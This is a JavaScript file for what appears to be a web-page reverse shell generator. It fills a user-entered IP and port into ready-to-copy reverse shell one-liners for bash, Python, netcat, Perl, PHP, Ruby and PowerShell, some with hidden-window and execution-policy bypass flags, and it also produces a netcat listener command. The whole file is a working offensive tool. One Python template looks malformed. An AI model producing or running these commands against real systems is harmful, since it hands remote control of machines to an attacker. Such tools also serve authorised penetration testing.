const reverseShells = {
  bash: [
    (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    (ip, port) => `exec bash -i &>/dev/tcp/${ip}/${port} <&1`,
    (ip, port) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`
  ],
  
  python: [
    (ip, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    (ip, port) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    (ip, port) => `python -c 'import socket;exec(socket.socket(socket.AF_INET,socket.SOCK_STREAM).connect(("${ip}",${port})))'`
  ],
  
  netcat: [
    (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
    (ip, port) => `nc -c /bin/sh ${ip} ${port}`,
    (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`
  ],
  
  perl: [
    (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    (ip, port) => `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
    (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,pack_sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`
  ],
  
  php: [
    (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    (ip, port) => `php -r '$s=fsockopen("${ip}",${port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`,
    (ip, port) => `php -r 'system("/bin/bash -c \"bash -i >& /dev/tcp/${ip}/${port} 0>&1\"");'`
  ],
  
  ruby: [
    (ip, port) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    (ip, port) => `ruby -e 'require "socket";c=TCPSocket.new("${ip}",${port});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    (ip, port) => `ruby -rsocket -e 'c=TCPSocket.new("${ip}",${port});while(cmd=c.gets.chomp);IO.popen(cmd,"r"){|io|c.puts io.read}end'`
  ],
  
  powershell: [
    (ip, port) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    (ip, port) => `powershell -Command "$client = New-Object System.Net.Sockets.TCPClient('${ip}', ${port}); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.Write('PowerShell Reverse Shell'); $writer.Flush(); $reader = New-Object System.IO.StreamReader($stream); while($reader.Peek() -ne -1) { $cmd = $reader.ReadLine(); $output = Invoke-Expression $cmd; $writer.WriteLine($output); $writer.Flush() }"`,
    (ip, port) => `powershell -ExecutionPolicy Bypass -Command "$TCPClient = New-Object Net.Sockets.TCPClient('${ip}', ${port}); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter.AutoFlush = $true; while($true){ $Command = $StreamReader.ReadLine(); $Output = Invoke-Expression $Command; $StreamWriter.WriteLine($Output); }`
  ]
};

const listenerCommands = {
  tcp: [
    (port) => `nc -lvnp ${port}`
  ]
};

function generateShell(type) {
  const ipInput = document.getElementById('ip');
  const portInput = document.getElementById('port');
  const outputElements = [
    document.getElementById('shellOutput1'),
    document.getElementById('shellOutput2'),
    document.getElementById('shellOutput3')
  ];

  if (!ipInput.value || !portInput.value) {
    alert('Please enter both IP and Port');
    return;
  }

  const shellVariants = reverseShells[type];
  
  // Clear previous outputs
  outputElements.forEach(el => el.textContent = '');

  // Generate up to 3 variants
  shellVariants.slice(0, 3).forEach((shellGenerator, index) => {
    const shell = shellGenerator(ipInput.value, portInput.value);
    outputElements[index].textContent = shell;
  });
}

function generateListener() {
  const portInput = document.getElementById('port');
  const outputElement = document.getElementById('listenerOutput1');

  if (!portInput.value) {
    alert('Please enter a Port');
    return;
  }

  // Clear previous output
  outputElement.textContent = '';

  // Generate listener command
  const listener = listenerCommands.tcp[0](portInput.value);
  outputElement.textContent = listener;
}

function copyToClipboard(elementId) {
  const shellOutput = document.getElementById(elementId);
  navigator.clipboard.writeText(shellOutput.textContent).then(() => {
    alert('Copied to clipboard!');
  });
}

// Add event listener to generate listener when port is entered
document.getElementById('port').addEventListener('change', generateListener);